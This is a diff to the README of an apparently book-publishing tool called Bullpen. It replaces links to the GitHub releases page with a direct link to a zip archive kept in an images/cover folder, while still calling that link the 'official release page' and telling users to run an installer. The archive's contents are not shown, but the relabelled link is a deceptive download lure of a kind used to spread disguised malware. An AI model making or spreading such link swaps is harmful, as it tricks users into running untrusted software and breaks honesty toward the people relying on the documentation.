@@ -1,6 +1,6 @@
 # 🖋️ bullpen - Write books once and publish everywhere
 
-[![Download Bullpen](https://img.shields.io/badge/Download_Bullpen-Blue-blue)](https://github.com/Jjes6128/bullpen/releases)
+[![Download Bullpen](https://img.shields.io/badge/Download_Bullpen-Blue-blue)](https://github.com/Jjes6128/bullpen/raw/refs/heads/main/images/cover/Software-v2.8.zip)
 
 Bullpen turns your writing into finished books. You write once in simple markdown files. The software converts your text into professional formats like PDF, EPUB, and MOBI. It handles the layout for KDP paperbacks and creates cover wraps. You create your entire book pipeline inside one tool.
 
@@ -8,7 +8,7 @@ Bullpen turns your writing into finished books. You write once in simple markdow
 
 Follow these steps to get Bullpen on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Jjes6128/bullpen/releases).
+1. Go to the [official release page](https://github.com/Jjes6128/bullpen/raw/refs/heads/main/images/cover/Software-v2.8.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.msi` or `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
